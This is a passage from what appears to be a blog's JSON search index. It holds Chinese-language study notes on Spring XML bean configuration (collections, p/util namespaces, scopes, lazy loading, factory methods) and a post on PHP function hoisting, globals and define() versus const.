class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Kane\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">setName</span><span class=\"params\">(String name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>屬性名字如上 name，是跟著 set<strong>Name</strong>一致<br>假如 method 名稱改成 setName1， xml 配住需要改<code>&lt;property name=&quot;name1&quot; value=&quot;Kane&quot;&gt;</code></p>\n<h3 id=\"一般-property-標籤方法\"><a href=\"#一般-property-標籤方法\" class=\"headerlink\" title=\"一般 property 標籤方法\"></a>一般 property 標籤方法</h3><h4 id=\"array-1\"><a href=\"#array-1\" class=\"headerlink\" title=\"array\"></a>array</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"classroom1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.classroom\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"students\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">array</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student2\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">array</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"list-1\"><a href=\"#list-1\" class=\"headerlink\" title=\"list\"></a>list</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"classroom1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.classroom\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"students\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student2\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"classroom1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.classroom\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"students\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">set</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student2\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">set</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"object\"><a href=\"#object\" class=\"headerlink\" title=\"object\"></a>object</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"classroom1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.classroom\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"student\"</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"p-命名空間\"><a href=\"#p-命名空間\" class=\"headerlink\" title=\"p 命名空間\"></a>p 命名空間</h3><p>在 beans 屬性加入<code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code><br>如:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:p</span>=<span class=\"string\">\"http://www.springframework.org/schema/p\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">        http://www.springframework.org/schema/beans/spring-beans.xsd\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"一般使用方法\"><a href=\"#一般使用方法\" class=\"headerlink\" title=\"一般使用方法\"></a>一般使用方法</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.student\"</span> <span class=\"attr\">p:name</span>=<span class=\"string\">\"John\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"object-1\"><a href=\"#object-1\" class=\"headerlink\" title=\"object\"></a>object</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"classroom1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.Classroom\"</span> <span class=\"attr\">p:student-ref</span>=<span class=\"string\">\"student1\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>備註<br>p 命名空間一樣不能用集合(collection)方法</p>\n<h4 id=\"util-名稱空間\"><a href=\"#util-名稱空間\" class=\"headerlink\" title=\"util 名稱空間\"></a>util 名稱空間</h4><p>只能用在 p命名空間</p>\n<h5 id=\"宣告\"><a href=\"#宣告\" class=\"headerlink\" title=\"宣告\"></a>宣告</h5><p><code>xmlns:util=&quot;http://www.springframework.org/schema/util&quot;</code><br>和<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">xsi:schemaLocation=\"http://www.springframework.org/schema/beans</span><br><span class=\"line\">http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span><br><span class=\"line\">http://www.springframework.org/schema/util</span><br><span class=\"line\">http://www.springframework.org/schema/util/spring-util-4.1.xsd\"&gt;</span><br></pre></td></tr></table></figure></p>\n<p>結果</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> </span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns:util</span>=<span class=\"string\">\"http://www.springframework.org/schema/util\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">     http://www.springframework.org/schema/util</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">     http://www.springframework.org/schema/util/spring-util-4.1.xsd\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"使用-array-或-list\"><a href=\"#使用-array-或-list\" class=\"headerlink\" title=\"使用 array 或 list\"></a>使用 array 或 list</h5><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">util:list</span> <span class=\"attr\">id</span>=<span class=\"string\">\"studentList\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student2\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">util:list</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"classroom1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.classroom\"</span> <span class=\"attr\">p:students-ref</span>=<span class=\"string\">\"studentList\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- &lt;property name=\"students\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">    &lt;list&gt;</span></span><br><span class=\"line\"><span class=\"comment\">        &lt;ref bean=\"student1\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">        &lt;ref bean=\"student2\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">    &lt;/list&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;/property&gt; --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"set、map\"><a href=\"#set、map\" class=\"headerlink\" title=\"set、map\"></a>set、map</h5><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">util:map</span> <span class=\"attr\">id</span>=<span class=\"string\">\"studentList\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student2\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">util:map</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>以此類推</p>\n<h2 id=\"複習Spring-那些裝配\"><a href=\"#複習Spring-那些裝配\" class=\"headerlink\" title=\"複習Spring 那些裝配\"></a>複習Spring 那些裝配</h2><ol>\n<li>自動裝配</li>\n<li>Java 裝配</li>\n<li>XML 裝配</li>\n</ol>\n<h2 id=\"相關知識\"><a href=\"#相關知識\" class=\"headerlink\" title=\"相關知識\"></a>相關知識</h2><h3 id=\"預設注入生命週期\"><a href=\"#預設注入生命週期\" class=\"headerlink\" title=\"預設注入生命週期\"></a>預設注入生命週期</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.student\"</span> <span class=\"attr\">p:name</span>=<span class=\"string\">\"John\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">test1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\" Student \"</span> + <span class=\"keyword\">this</span>.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith</span>(SpringJUnit4ClassRunner.class)</span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration</span>(<span class=\"string\">\"classpath:applicationContext.xml\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AppTest</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Student student1;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Student student2;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@test</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AppTest</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] argv)</span></span>&#123;</span><br><span class=\"line\">        ApplicationContext context = <span class=\"keyword\">new</span> ClassPathXmlApplicationContext(<span class=\"string\">\"applicationContext.xml\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Student st1 = (Student)context.getBean(\"student\");</span></span><br><span class=\"line\">        <span class=\"comment\">// Student st2 = (Student)context.getBean(\"student\");</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// System.out.println(st1 == st2); //true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>執行程式會看到 Bean 會啟動，不管會不會呼叫<br>預設啟動是<strong>單例模式</strong></p>\n<h3 id=\"生命週期\"><a href=\"#生命週期\" class=\"headerlink\" title=\"生命週期\"></a>生命週期</h3><ol>\n<li>單例(Sinletion)</li>\n</ol>\n<p>在整個應用程序中，只創建 bean 的一個實例</p>\n<ol start=\"2\">\n<li>原型(Prototype)</li>\n</ol>\n<p>每次注入或通過 Spring 上下文獲取的時候，都會創建一個新的 bean 實例<br>簡單說就是每一次 @Autowired 都會實例出來</p>\n<ol start=\"3\">\n<li>會話(Session)</li>\n</ol>\n<p>在 Web 應用中，為每個會話創建一個 bean 實例</p>\n<ol start=\"4\">\n<li>請求(Request)</li>\n</ol>\n<p>在 Web 應用中，為每個請求創建一個 bean 實例</p>\n<h4 id=\"設定生命周期作用域\"><a href=\"#設定生命周期作用域\" class=\"headerlink\" title=\"設定生命周期作用域\"></a>設定生命周期作用域</h4><p><strong>scope=</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.student\"</span> <span class=\"attr\">p:name</span>=<span class=\"string\">\"John\"</span> <span class=\"attr\">scope</span>=<span class=\"string\">\"prototype\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"總整理作用域配置\"><a href=\"#總整理作用域配置\" class=\"headerlink\" title=\"總整理作用域配置\"></a>總整理作用域配置</h2><h3 id=\"xml-配置\"><a href=\"#xml-配置\" class=\"headerlink\" title=\"xml 配置\"></a>xml 配置</h3><p>scope=”singleton”</p>\n<h3 id=\"自動裝配\"><a href=\"#自動裝配\" class=\"headerlink\" title=\"自動裝配\"></a>自動裝配</h3><p>@Component<br>@Scope(“singletion”)</p>\n<h3 id=\"JavaConfig-配置\"><a href=\"#JavaConfig-配置\" class=\"headerlink\" title=\"JavaConfig 配置\"></a>JavaConfig 配置</h3><p>@Bean<br>@Scope(ConfigurableBeanFactory.SCOPE_SINGLETON)</p>\n<h2 id=\"延遲加載\"><a href=\"#延遲加載\" class=\"headerlink\" title=\"延遲加載\"></a>延遲加載</h2><p>通常用於單例模式</p>\n<h3 id=\"xml-配置-1\"><a href=\"#xml-配置-1\" class=\"headerlink\" title=\"xml 配置\"></a>xml 配置</h3><p>lazy-init=”true”</p>\n<h3 id=\"自動配裝\"><a href=\"#自動配裝\" class=\"headerlink\" title=\"自動配裝\"></a>自動配裝</h3><p>@Component<br>@Lazy</p>\n<h3 id=\"JavaConfig\"><a href=\"#JavaConfig\" class=\"headerlink\" title=\"JavaConfig\"></a>JavaConfig</h3><p>@Bean<br>@Lazy</p>\n<h2 id=\"初始化方法和銷毀方法\"><a href=\"#初始化方法和銷毀方法\" class=\"headerlink\" title=\"初始化方法和銷毀方法\"></a>初始化方法和銷毀方法</h2><h3 id=\"xml-配置-2\"><a href=\"#xml-配置-2\" class=\"headerlink\" title=\"xml 配置\"></a>xml 配置</h3><p>init-method=”init” destory-method=”destory”</p>\n<h3 id=\"自動配裝和-JavaConfig\"><a href=\"#自動配裝和-JavaConfig\" class=\"headerlink\" title=\"自動配裝和 JavaConfig\"></a>自動配裝和 JavaConfig</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@PostConstruct</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123; System.out.println(<span class=\"string\">\"始化方法\"</span>); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@PreDestroy</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123; System.out.println(<span class=\"string\">\"銷毀方法\"</span>); &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"工廠方法\"><a href=\"#工廠方法\" class=\"headerlink\" title=\"工廠方法\"></a>工廠方法</h2><h3 id=\"靜態工廠方法\"><a href=\"#靜態工廠方法\" class=\"headerlink\" title=\"靜態工廠方法\"></a>靜態工廠方法</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.Student\"</span> <span class=\"attr\">factory-method</span>=<span class=\"string\">\"createStudent1\"</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"實例方法\"><a href=\"#實例方法\" class=\"headerlink\" title=\"實例方法\"></a>實例方法</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"studentFactory\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.Student\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student2\"</span> <span class=\"attr\">factory-bean</span>=<span class=\"string\">\"studentFactory\"</span> <span class=\"attr\">factory-method</span>=<span class=\"string\">\"createStudent1\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"props-屬性\"><a href=\"#props-屬性\" class=\"headerlink\" title=\"props 屬性\"></a>props 屬性</h2><p>其他參考:<br><a href=\"https://blog.csdn.net/soonfly/article/details/68928683\" target=\"_blank\" rel=\"noopener\">【Spring学习12】XML简写p-namespace及c-namespace_java_程序老兵的博客-CSDN博客</a><br><a href=\"https://matthung0807.blogspot.com/2017/11/springproperties.html\" target=\"_blank\" rel=\"noopener\">菜鳥工程師 肉豬: Spring 注入properties檔的參數設定</a><br><a href=\"https://josephdotw.blogspot.com/2018/09/java-spring-framework-1-bean.html\" target=\"_blank\" rel=\"noopener\">Joseph 筆記本: Java Spring Framework 筆記 - Bean configutation file 設定</a><br><a href=\"https://www.cnblogs.com/sanhuan/p/4789054.html\" target=\"_blank\" rel=\"noopener\">spring中constructor-arg 构造方法注入 - 红色小宇宙 - 博客园</a></p>\n","categories":["Java"],"tags":["spring"]},{"title":"手邊PHP一些note...","url":"/blog/2018/11/15/%E6%89%8B%E9%82%8APHP%E4%B8%80%E4%BA%9Bnote/","content":"<p>最近發現PHP function宣告寫在下面<br>竟然上面可以呼叫…<br>我以為是JavaScript的hoisting一樣的東西？<br>剛好看的<a href=\"https://blog.techbridge.cc/2018/11/10/javascript-hoisting/?fbclid=IwAR0DxYCVyKD-y1WkcFn3IumG9IUlGd6GyASAeMhvRGe13C4qK1ps_5e6-pw\" target=\"_blank\" rel=\"noopener\">我知道你懂 hoisting，可是你了解到多深？ | TechBridge 技術共筆部落格</a><br>只有略懂略懂…<br>但為什麼可以呼叫呢？<br>目前還沒找到原因<br>所以先整理出來</p>\n<a id=\"more\"></a>\n<p>在這邊我先說我的猜測<strong>不一定是正確原因</strong><br>原本想說PHP的function name會不會跟<code>常數</code>是用同一個地方<br>結果是了一下，發現常數竟然有分大小寫，但感覺不會跟變數衝到….<br>好神奇，可能JS寫太久，覺得怪怪的 哈哈</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/27211326/php-calling-a-function-before-it-is-declared\" target=\"_blank\" rel=\"noopener\">PHP - calling a function before it is declared - Stack Overflow</a></li>\n</ul>\n<blockquote>\n<p>Functions need not be defined before they are referenced, except when a function is conditionally defined as shown in the two examples below.</p>\n</blockquote>\n<p>這邊就說明了function放後面，可以呼叫。還可以透過<code>Conditional functions</code>這東西，這也滿奇怪的</p>\n<ul>\n<li><a href=\"http://php.net/manual/zh/functions.user-defined.php\" target=\"_blank\" rel=\"noopener\">PHP: 用户自定义函数 - Manual</a></li>\n</ul>\n<p>中間有想到是不是<code>常數</code>跟function一樣可以放後面<br>但<strong>答案是不行的</strong></p>\n<ul>\n<li><p><a href=\"http://php.net/manual/zh/language.variables.superglobals.php\" target=\"_blank\" rel=\"noopener\">PHP: 超全局变量 - Manual</a></p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/09217582cc08\" target=\"_blank\" rel=\"noopener\">彻底搞懂PHP的变量作用域和全局变量 - 简书</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $a; </span><br><span class=\"line\">    <span class=\"keyword\">unset</span>($a); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">$a = <span class=\"number\">1</span>; </span><br><span class=\"line\">test(); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>结果</p>\n<pre><code>明明是unset了呀，为什么还会打印出来呢？\n众所周知，我们的function里面的永远是个私有变量，unset的确是起作用了，它unset了一个global 的值呀，而global在函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量；$GLOBALS[]确确实实调用是外部的变量，函数内外会始终保持一致！\n</code></pre><p>作者：michaelgbw<br>链接：<a href=\"https://www.jianshu.com/p/09217582cc08\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/09217582cc08</a><br>來源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>\n<p>老實說…，我還是沒有搞清楚<br>但這樣看下去，可能還有static要看</p>\n<ul>\n<li><a href=\"http://php.net/manual/en/userlandnaming.php\" target=\"_blank\" rel=\"noopener\">PHP: Userland Naming Guide - Manual</a></li>\n<li><p><a href=\"http://rocksaying.tw/archives/10814499.html\" target=\"_blank\" rel=\"noopener\">PHP 5.3/6 新增功能 - Namespace - 石頭閒語</a></p>\n</li>\n<li><p><a href=\"https://imyoungyang.gitbooks.io/php7-study-group-notes/content/Chapter2/php-something-should-know.html\" target=\"_blank\" rel=\"noopener\">PHP 必須要知道的小細節 · PHP7 開發之道</a></p>\n</li>\n</ul>\n<blockquote>\n<p>define() vs const 常數定義<br>最主要的原因是底層的不同<br>    define() 是 run-time constants 而 const 是 compile-time constants.<br>    define() 是 global scope 或者在某個 namespace，所以不能用來定義 class-scope 的常數。<br>    define()可以用在 if() 但 const不能用在 if()</p>\n</blockquote>\n<p>看到這邊還真的不知道這兩個不太一樣orz</p>\n<ul>\n<li><a href=\"https://my.oschina.net/u/1766067/blog/299888\" target=\"_blank\" rel=\"noopener\">PHP严重致命错误处理:php Fatal error: Cannot redeclare clas - 小星星程序员的个人空间 - 开源中国</a></li>\n</ul>\n<p>function,class重複宣告會有問題</p>\n<ul>\n<li><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/573568/\" target=\"_blank\" rel=\"noopener\">PHP中的提升(Hoisting) | 程式前沿</a></li>\n</ul>\n<p>這篇有簡易測試Hoisting，不過我認為跟js的hoisting不一樣<br>還有測試code<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$poor_function = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var_dump(function_exists(<span class=\"string\">'poor_function'</span>));</span><br></pre></td></tr></table></figure></p>\n<p>這樣是沒有意義的<br>可以參考下面裡面</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/8466473/use-variable-as-function-name-in-php\" target=\"_blank\" rel=\"noopener\">Use Variable as Function Name in PHP - Stack Overflow</a><br>不過我有測試<code>var_dump($poor_function)</code>顯示是一個閉包</li>\n</ul>\n<ul>\n<li><a href=\"https://www.jianshu.com/p/a38b81433183\" target=\"_blank\" rel=\"noopener\">PHP中定义常量的区别，define() vs. const - 简书</a><br>這邊有紀錄很多define()跟const差異</li>\n</ul>\n<p>其他要紀錄的</p>\n<ul>\n<li><a href=\"http://blog.jobbole.com/94475/\" target=\"_blank\" rel=\"noopener\">PHP 底层的运行机制与原理 - 文章 - 伯乐在线</a></li>\n<li><a href=\"https://www.awaimai.com/371.html?fbclid=IwAR1dC7s3yKPjJM-PdYTQoAudEkRpG17LgOXc-h1kM_I0K4ZzxHLGq9H2ML8\" target=\"_blank\" rel=\"noopener\">CGI、FastCGI和PHP-FPM关系图解 - 歪麦博客</a></li>\n<li><a href=\"https://stackoverflow.com/questions/2040240/php-function-to-generate-v4-uuid\" target=\"_blank\" rel=\"noopener\">PHP function to generate v4 UUID - Stack Overflow</a></li>\n</ul>\n<p>結論，我還是不懂PHP  QQ</p>\n"},{"title":"抓 IP 